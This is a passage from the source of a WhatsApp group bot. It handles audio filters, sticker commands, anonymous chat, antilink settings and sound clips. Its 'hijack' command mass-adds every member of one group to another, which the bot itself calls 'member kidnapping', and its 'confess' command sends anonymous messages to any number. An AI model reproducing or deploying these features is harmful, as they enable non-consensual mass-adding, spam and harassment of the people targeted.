                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                XeonBotInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                m.reply(e)
                }
                break
            case 'setcmd': {
                if (!m.quoted) throw 'Reply Message!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `For What Command?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `No hashes`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                XeonBotInc.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply Message!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case 'addmsg': {
                if (!m.quoted) throw 'Reply Message You Want To Save In Database'
                if (!text) throw `Example : ${prefix + command} filename`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' registered in the message list`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) throw `Example : ${prefix + command} file name\n\nView message list with ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' not listed in the message list`
                XeonBotInc.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		m.reply(`Successfully deleted '${text}' from the message list`)
            }
	    break
case 'developer': case 'dev': {
reply(`â€¢CHEEMS BOT DEVELOPERâ€¢\n\n\n   Â©2021-2022 Xeon Bot Inc.\n\nðŸ¦„Dream Guy Xeon\nPm: wa.me/916909137213`)
}
            break
case 'owner': case 'creator': case 'moderator': case 'mod': {
XeonBotInc.sendContact(m.chat, owner, m)
}
            break
        case 'menfess':
			case 'menfes':
			case 'confes':
			case 'confess':
				if (m.isGroup) return m.reply(mess.group)
				if (!text) return m.reply(`*How to use?*\n\Send command ${prefix + command} number|sender|message\n\nExample ${prefix + command} 91xxxxxxxxxx|handsome here|I have a crush on you\n\nExample 2 : ${prefix + command} 91xxxxxxxxxx|ur crush|I have a crush on you\n\nDon't worry, privacy is safe><`)
				let nomor = q.split('|')[0] ? q.split('|')[0] : q
				let saking = q.split('|')[1] ? q.split('|')[1] : q
				let pesan = q.split('|')[2] ? q.split('|')[2] : ''
				if (pesan.length < 1) return m.reply(`All must be filled in! eg : confess 91xxxxxxxxxx|from|hello dude`)
				 let teksnya = `Hi friend, there is confess message for you!!\n\nFrom :  _${saking}_  \nMessage : _${pesan}_ `
					gambar = `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`
				 var button = [{ buttonId: `menfesconfirm`, buttonText: { displayText: `CONFIRMâ€¡` }, type: 1 }, { buttonId: `menu`, buttonText: { displayText: `Menu` }, type: 1 }]
					XeonBotInc.sendMessage(`${nomor}@s.whatsapp.net`, { caption: teksnya, image: {url: `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`}, buttons: button, footer: botname })
				m.reply(`Success Sending Menfess!!`)
				break
			case 'menfesconfirm':{
 				 XeonBotInc.sendMessage(q, {text: `It's been confirmed, ConfessðŸŒ¹`})
				  m.reply(`Thank you confess for being accepted.`)
				}
				break
case 'anonymous': {
                if (m.isGroup) return m.reply(mess.group)
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [
                    { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                ]
                XeonBotInc.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await XeonBotInc.getName(m.sender)} Welcome To Anonymous Chat\n\nClick the button below to find a partner\`\`\``, botname, m)
            }
			break
case 'keluar': case 'leave': {
                if (m.isGroup) return m.reply('Features Cannot Be Used For Groups!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, `\`\`\`You Are Not In Anonymous Session, Press Button To Find Partner \`\`\``)
                    throw false
                }
                m.reply('Ok')
                let other = room.other(m.sender)
                if (other) await XeonBotInc.sendText(other, `\`\`\`Partner Has Left Anonymous Session\`\`\``, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case 'mulai': case 'start': {
                if (m.isGroup) return m.reply('Features Cannot Be Used For Groups!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, `\`\`\`You are still in an anonymous session, press the button below to terminate your anonymous session\`\`\``, botname, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, now you can send messages\`\`\``, botname, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await XeonBotInc.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, now you can send messages\`\`\``, botname, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, `\`\`\`Please wait, looking for a partner\`\`\``, botname, m)
                }
                break
            }
            case 'next': case 'lanjut': {
                if (m.isGroup) return m.reply('Features Cannot Be Used For Groups!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, `\`\`\`You are not in an anonymous session, press the button to find a partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await XeonBotInc.sendText(other, `\`\`\`Partner Has Left Anonymous Session\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``, botname, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await XeonBotInc.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``, botname, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, `\`\`\`Please wait, looking for a partner\`\`\``, botname, m)
                }
                break
            }
            case 'public': {
                if (!isCreator) throw mess.owner
                XeonBotInc.public = true
                m.reply('*Successful in Changing To Public Usage*')
            }
            break
            case 'self': {
                if (!isCreator) throw mess.owner
                XeonBotInc.public = false
                m.reply('*Successful in Changing To Self Usage*')
            }
            break
            case 'ping': case 'botstatus': case 'statusbot': case 'p': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

ðŸ’» Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                m.reply(respon)
            }
            break
            case 'setmenu': {
            if (!isCreator) throw mess.owner
            let setbot = db.data.settings[botNumber]
               if (args[0] === 'templateImage'){
                setbot.templateImage = true
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateVideo'){
                setbot.templateImage = false
                setbot.templateVideo = true
                setbot.templateGif = false
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateGif'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = true
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateMessage'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = true
                m.reply(mess.success)
                } else {
                let sections = [
                {
                title: "CHANGE MENU BOT",
                rows: [
                {title: "Template Image", rowId: `setmenu templateImage`, description: `Change menu bot to Template Image`},
                {title: "Template Video", rowId: `setmenu templateVideo`, description: `Change menu bot to Template Video`},
                {title: "Template Gif", rowId: `setmenu templateGif`, description: `Change menu bot to Template Gif`},
                {title: "Template Message", rowId: `setmenu templateMessage`, description: `Change menu bot to Template Message`}
                ]
                },
                ]
                XeonBotInc.sendListMsg(m.chat, `pilih aja *Din* Setmenu nya!`, XeonBotInc.user.name, `*Hello XeonBotInc* !`, `Pilih Din`, sections, m)
                }
            }
            break
            
case 'req': case 'request': {
            	if (!text) throw `Example : ${prefix + command} Fitur Min`
               let ownernya = ownernomer + '@s.whatsapp.net'
               let me = m.sender
               let pjtxt = `Message From : @${me.split('@')[0]} \nFor : @${ownernya.split('@')[0]}\n\n${command} ${text}`
               let ments = [ownernya, me]
               let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'ðŸ™THANKS' }, type: 1 }]
            await XeonBotInc.sendButtonText(ownernya, buttons, pjtxt, botname, m, {mentions: ments, quoted: fdoc})
            let akhji = `*Request has been sent*\n*To Owner @${ownernya.split('@')[0]}*\n_Thank youðŸ™_`
            await XeonBotInc.sendButtonText(m.chat, buttons, akhji, botname, m, {mentions: ments, quoted: fkontak})
            }
            break
case 'report': case 'bug': {
            	if (!text) throw `Example : ${prefix + command} Report an error feature`
               let ownernya = ownernomer + '@s.whatsapp.net'
               let me = m.sender
               let pjtxt = `Message From : @${me.split('@')[0]} \nFor : @${ownernya.split('@')[0]}\n\n${text}`
               let ments = [ownernya, me]
               let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'ðŸ™THANKS FOR THE REPORT' }, type: 1 }]
            await XeonBotInc.sendButtonText(ownernya, buttons, pjtxt, botname, m, {mentions: ments})
            let akhji = `Report Sent\nTo Owner @${ownernya.split('@')[0]}\n*Thank you for the reportðŸ™*\n_Your number will be blocked_\n_If the Report is Only Created_`
            await XeonBotInc.sendButtonText(m.chat, buttons, akhji, botname, m, {mentions: ments})
            }
            break
            case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'wer':
XeonBotInc_dev = await getBuffer(`https://github.com/T556yyhe4r/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await XeonBotInc.sendMessage(m.chat, { audio: XeonBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'hijack':{
  if(!isCreator) throw mess.owner
  let text1 = q.split("|")[0]
  let text2 = q.split("|")[1]
  if(!text1) throw `Example:\n${order +' 1234567890@g.us|_amount_'}`
  if(!text2) throw `Eg:\n${order +' 1234567890@g.us|_amount_'}`
  XeonBotInc.sendMessage(text1, { text: `Member kidnapping request by @${m.sender.split("@")[0]}\nAmount: ${text2}\nImporting from : ${from} => ${text1}`, mentions: [m.sender] },{ quoted : m })               
  await XeonBotInc.sendMessage(from, { text: `Member kidnapping request by @${m.sender.split("@")[0]}\nAmount: ${text2}\nImporting from : ${from} => ${text1}`, mentions: [m.sender] },{ quoted : m })                
  await m.sequestrar(text1, participants.map(mem => mem.id), text2)
  }
  break
case 'setthumb':{
                       if (!m.key.fromMe && !isCreator) return m.reply(mess.owner)
                       if (!isQuotedImage) return m.reply('Reply the picture!')
                                 let media = await XeonBotInc.downloadMediaMessage(m.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
                await fs.writeFileSync('./XeonMedia/theme/cheemspic.jpg', media)
               m.reply(mess.success)
            }
          break
case 'creategroup':
if (!isCreator) return m.reply(mess.owner)
if (!q) return reply("Enter text")
const group = await XeonBotInc.groupCreate(q, [owner + "@s.whatsapp.net"])
m.reply(mess.success)
XeonBotInc.sendMessage(group.id, { text: 'Halo!!' }) // say hello to everyone on the group
break
case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return m.reply('Already activated')
ntilinkytvid.push(from)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
m.reply('Success in turning on youtube video antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`ã€Œ âš ï¸Warningâš ï¸ ã€\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return m.reply('Already deactivated')
let off = ntilinkytvid.indexOf(from)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
m.reply('Success in turning off youtube video antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
    case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return m.reply('Already activated')
ntilinkytch.push(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
m.reply('Success in turning on youtube channel antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`ã€Œ âš ï¸Warningâš ï¸ ã€\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return m.reply('Already deactivated')
let off = ntilinkytch.indexOf(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
m.reply('Success in turning off youtube channel antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
      case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkInstagram) return m.reply('Already activated')
ntilinkig.push(from)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
m.reply('Success in turning on instagram antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`ã€Œ âš ï¸Warningâš ï¸ ã€\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return m.reply('Already deactivated')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
m.reply('Success in turning off instagram antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
        case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkFacebook) return m.reply('Already activated')
ntilinkfb.push(from)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
m.reply('Success in turning on facebook antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`ã€Œ âš ï¸Warningâš ï¸ ã€\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return m.reply('Already deactivated')
let off = ntilinkfb.indexOf(from)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
m.reply('Success in turning off facebook antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
          case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTelegram) return m.reply('Already activated')
ntilinktg.push(from)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
m.reply('Success in turning on telegram antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`ã€Œ âš ï¸Warningâš ï¸ ã€\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return m.reply('Already deactivated')
let off = ntilinktg.indexOf(from)
ntilinktg.splice(off, 1)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
m.reply('Success in turning off telegram antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
            case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTiktok) return m.reply('Already activated')
ntilinktt.push(from)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
m.reply('Success in turning on tiktok antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`ã€Œ âš ï¸Warningâš ï¸ ã€\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return m.reply('Already deactivated')
let off = ntilinktt.indexOf(from)
ntilinktt.splice(off, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
m.reply('Success in turning off tiktok antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
            case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return m.reply('Already activated')
ntilinktwt.push(from)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
m.reply('Success in turning on twitter antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`ã€Œ âš ï¸Warningâš ï¸ ã€\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return m.reply('Already deactivated')
let off = ntilinktwt.indexOf(from)
ntilinktwt.splice(off, 1)
